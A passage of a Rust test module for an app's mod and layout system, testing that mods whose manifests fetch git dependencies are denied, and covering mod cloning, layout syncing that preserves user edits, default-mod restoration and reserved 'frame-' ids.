        let loads = [None, Some("null"), Some("{}"), Some(" { } ")];
        let allowed = |hash: String| BTreeMap::from([("deps-shapes".to_owned(), crate::settings::ModChoice { hash, allow: true })]);
        let write = |text: &str| std::fs::write(root.join("gpui-shell.json"), text).unwrap();
        for deps in blocked {
            write(&manifest(Some(deps)));
            let shown = &deps[..deps.len().min(60)];
            // Allowed for exactly this code, denied, or never asked: it never runs and is never offered.
            assert_eq!(trust(&found, &allowed(content_hash(&root))), Trust::Denied, "{shown}");
            assert_eq!(trust(&found, &BTreeMap::new()), Trust::Denied, "{shown}");
        }
        for deps in loads {
            write(&manifest(deps));
            // gpui-shell itself fetches nothing for these.
            assert!(gpui_shell::plugin::PluginManifest::parse(&manifest(deps)).unwrap().dependencies().is_empty(), "{deps:?}");
            assert_eq!(trust(&found, &allowed(content_hash(&root))), Trust::Allowed, "{deps:?}");
            assert_eq!(trust(&found, &BTreeMap::new()), Trust::Ask(content_hash(&root)), "{deps:?}");
        }
        // Whatever gpui-shell would fetch for, the mod is blocked: the check reads the manifest as gpui-shell does.
        let mut fetching = 0;
        for text in [
            manifest(Some(r#"{"lib":"https://example.com/l.git#main"}"#)),
            format!("{}\n", manifest(Some(r#"{"lib":{"git":"https://example.com/l.git","tag":"v1"}}"#))),
            // A repeated key: both read the last one.
            r#"{"id":"deps-shapes","name":"x","entry":"main.js","dependencies":null,"dependencies":{"lib":"https://example.com/l.git#main"}}"#.to_owned(),
            r#"{"id":"deps-shapes","name":"x","entry":"main.js","dependencies":{"lib":"https://example.com/l.git#main"},"dependencies":{}}"#.to_owned(),
            // Not readable as a manifest: gpui-shell refuses to load it at all.
            format!("\u{feff}{}", manifest(Some(r#"{"lib":"https://example.com/l.git#main"}"#))),
            r#"{"id":"deps-shapes","dependencies":{"lib":"https://example.com/l.git#main""#.to_owned(),
            String::new(),
        ] {
            write(&text);
            let fetches = gpui_shell::plugin::PluginManifest::parse(&text).is_ok_and(|m| !m.dependencies().is_empty());
            if fetches {
                fetching += 1;
                assert_eq!(trust(&found, &allowed(content_hash(&root))), Trust::Denied, "{text}");
            }
        }
        // The first three manifests are ones gpui-shell fetches for.
        assert!(fetching >= 3, "{fetching}");
        std::fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn cloned_mods_rewrite_assets_and_self_overlays_and_reject_nonobject_metadata() {
        let root = std::env::temp_dir().join(format!("h0x-mod-clone-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(root.join("original")).unwrap();
        std::fs::write(root.join("original/mod.json"), "{}").unwrap();
        std::fs::write(root.join("original/main.js"), r#"const ASSETS = "mods/original"; const icon = 'mods/original/icon.svg'; openOverlay({ mod: "original" });"#).unwrap();
        std::fs::write(root.join("original/icon.svg"), "<svg/>").unwrap();
        clone_mod_at(&root, "original", "copy").unwrap();
        let text = std::fs::read_to_string(root.join("copy/main.js")).unwrap();
        assert!(text.contains("\"mods/copy\"") && text.contains("'mods/copy/icon.svg'") && text.contains("mod: \"copy\""));
        assert_eq!(std::fs::read_to_string(root.join("copy/icon.svg")).unwrap(), "<svg/>");
        assert!(clone_mod_at(&root, "original", "copy").is_err());
        for invalid in ["[]", "42", "true", "null", "\"text\""] {
            std::fs::write(root.join("original/mod.json"), invalid).unwrap();
            assert!(clone_mod_at(&root, "original", "bad").is_err());
            assert!(!root.join("bad").exists());
        }
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn layout_formatting_is_not_an_edit_and_rescued_clicks_still_apply() {
        use crate::layout::{Node, Size};
        use crate::layout_sync::State;
        let root = std::env::temp_dir().join(format!("h0x-layout-click-rescue-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let dir = root.join("layouts");
        std::fs::create_dir_all(dir.join(".state")).unwrap();
        std::fs::create_dir_all(dir.join(".base")).unwrap();
        let shipped = r#"{"id":"root","type":"block","content":{"mod":"files"},"size":{"px":360}}"#;
        // No record: formatting, BOM and whole-number floats are not edits.
        std::fs::write(dir.join("main.json"), "\u{feff}{\r\n \"type\":\"block\", \"id\":\"root\", \"size\":{\"px\":360.0}, \"content\":{\"mod\":\"files\"}}").unwrap();
        sync_layouts(&root, &[("main", shipped)]).unwrap();
        assert!(!dir.join("main-edited.json").exists());
        assert!(!dir.join(".base").exists());
        let mut file: Node = serde_json::from_str(shipped).unwrap();
        file.size = Some(Size::Px { px: 400.0 });
        std::fs::write(dir.join("main.json"), crate::layout_sync::text_of(&file)).unwrap();
        let mut shown = file.clone();
        shown.size = Some(Size::Px { px: 500.0 });
        let mut state = State::between(&file, &shown);
        state.file = serde_json::to_value(&file).ok();
        std::fs::write(dir.join(".state/main.json"), serde_json::to_string(&state).unwrap()).unwrap();
        sync_layouts(&root, &[("main", shipped)]).unwrap();
        let mut rescued: Node = serde_json::from_str(&std::fs::read_to_string(dir.join("main-edited.json")).unwrap()).unwrap();
        let mut clicks: State = serde_json::from_str(&std::fs::read_to_string(dir.join(".state/main-edited.json")).unwrap()).unwrap();
        clicks.forget_since_saved(&rescued);
        clicks.apply(&mut rescued);
        assert_eq!(rescued.size, Some(Size::Px { px: 500.0 }));
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn a_0_1_x_layout_is_kept_aside_quietly_not_rescued() {
        let root = std::env::temp_dir().join(format!("h0x-layout-0-1-x-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let dir = root.join("layouts");
        std::fs::create_dir_all(&dir).unwrap();
        // 0.1.x wrote no record of what it installed.
        std::fs::write(dir.join("main.json"), r#"{"id":"root","type":"block","content":{"mod":"old"}}"#).unwrap();
        take_sync_notes();
        sync_layouts(&root, &[("main", r#"{"id":"root","type":"block","content":{"mod":"new"}}"#)]).unwrap();
        assert!(std::fs::read_to_string(dir.join("main.json")).unwrap().contains("new"));
        let aside = dir.join(format!("main.json.before-{}", env!("CARGO_PKG_VERSION")));
        assert!(std::fs::read_to_string(aside).unwrap().contains("old"));
        assert!(!dir.join("main-edited.json").exists());
        assert!(take_sync_notes().is_empty(), "no toast for a file nobody can say was edited");
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn layouts_restore_preserve_edits_clicks_and_drop_only_untouched() {
        let root = std::env::temp_dir().join(format!("h0x-layout-sync-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let dir = root.join("layouts");
        sync_layouts(&root, &[("a", "a1"), ("b", "b1"), ("c", "c1")]).unwrap();
        std::fs::create_dir_all(dir.join(".state")).unwrap();
        std::fs::write(dir.join(".state/a.json"), "clicks").unwrap();
        std::fs::write(dir.join("a.json"), "mine").unwrap();
        std::fs::write(dir.join("b.json"), "kept").unwrap();
        sync_layouts(&root, &[("a", "a2")]).unwrap();
        assert_eq!(std::fs::read_to_string(dir.join("a.json")).unwrap(), "a2");
        assert_eq!(std::fs::read_to_string(dir.join("a-edited.json")).unwrap(), "mine");
        assert_eq!(std::fs::read_to_string(dir.join("b.json")).unwrap(), "kept");
        assert!(!dir.join("c.json").exists());
        assert_eq!(std::fs::read_to_string(dir.join(".state/a.json")).unwrap(), "clicks");
        std::fs::write(dir.join("a.json"), "again").unwrap();
        sync_layouts(&root, &[("a", "a2")]).unwrap();
        assert_eq!(std::fs::read_to_string(dir.join("a-edited-2.json")).unwrap(), "again");
        assert_eq!(std::fs::read_to_string(dir.join("a-edited.json")).unwrap(), "mine");
        std::fs::remove_file(dir.join("a.json")).unwrap();
        sync_layouts(&root, &[("a", "a3")]).unwrap();
        assert_eq!(std::fs::read_to_string(dir.join("a.json")).unwrap(), "a3");
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn default_mods_restore_shipped_and_move_edits_to_clones() {
        let root = std::env::temp_dir().join(format!("h0x-ade-sync-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let (mods, record) = (root.join("mods"), root.join("installed.json"));
        let read = |p: &str| std::fs::read_to_string(mods.join(p)).unwrap_or_default();

        let v1: &[(&str, &[u8])] = &[("a/main.js", b"a1"), ("a/old.js", b"x"), ("b/main.js", b"b1"), ("c/main.js", b"c1")];
        sync_defaults(&mods, &record, v1).unwrap();
        assert_eq!(read("a/main.js"), "a1");
        let before = std::fs::metadata(mods.join("a/main.js")).unwrap().modified().unwrap();
        sync_defaults(&mods, &record, v1).unwrap();
        assert_eq!(std::fs::metadata(mods.join("a/main.js")).unwrap().modified().unwrap(), before, "untouched mods are not rewritten");

        std::fs::write(mods.join("b/main.js"), "mine").unwrap();
        std::fs::remove_dir_all(mods.join("c")).unwrap();
        let v2: &[(&str, &[u8])] = &[("a/main.js", b"a2"), ("b/main.js", b"b2"), ("c/main.js", b"c2")];
        sync_defaults(&mods, &record, v2).unwrap();
        assert_eq!(read("a/main.js"), "a2", "untouched mods update");
        assert!(!mods.join("a/old.js").exists(), "files the update dropped go");
        assert_eq!(read("b/main.js"), "b2", "edited mods are restored");
        assert_eq!(read("b-edited/main.js"), "mine", "edits become a clone");
        assert_eq!(read("c/main.js"), "c2", "deleted mods are restored");
        std::fs::write(mods.join("b/main.js"), "changed again").unwrap();

        // No longer shipped: untouched ones go, edited ones stay, and so do
        // ones someone added a file to.
        let v3: &[(&str, &[u8])] = &[("c/main.js", b"c2"), ("d/main.js", b"d1")];
        sync_defaults(&mods, &record, v3).unwrap();
        std::fs::write(mods.join("d/notes.md"), "my notes").unwrap();
        let v4: &[(&str, &[u8])] = &[("c/main.js", b"c2")];
        sync_defaults(&mods, &record, v4).unwrap();
        assert!(!mods.join("a").exists(), "untouched dropped defaults go");
        assert_eq!(read("b/main.js"), "changed again", "edited dropped defaults stay");
        assert_eq!(read("b-edited/main.js"), "mine", "clones stay untouched");
        assert_eq!(read("d/notes.md"), "my notes", "a dropped default with an added file stays");

        std::fs::remove_dir_all(&root).unwrap();
    }
}

#[cfg(test)]
mod reserved_ids {
    #[test]
    fn a_persons_mod_can_never_take_a_frame_id() {
        let root = std::env::temp_dir().join(format!("h0x-ade-reserved-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        for name in ["frame-settings", "frame-consent", "frame-", "framed", "ok"] {
            std::fs::create_dir_all(root.join(name)).unwrap();
            std::fs::write(root.join(name).join("main.js"), "").unwrap();
        }
        let mut people: Vec<String> = super::scan_dir(&root, "").into_iter().map(|f| f.id).collect();
        people.sort();
        assert_eq!(people, ["framed", "ok"]);
        // The app's own pages keep their prefix.
        let frames: Vec<String> = super::scan_dir(&root, "frame-").into_iter().map(|f| f.id).collect();
        assert!(frames.contains(&"frame-ok".to_string()), "{frames:?}");
        std::fs::remove_dir_all(&root).unwrap();
    }
}
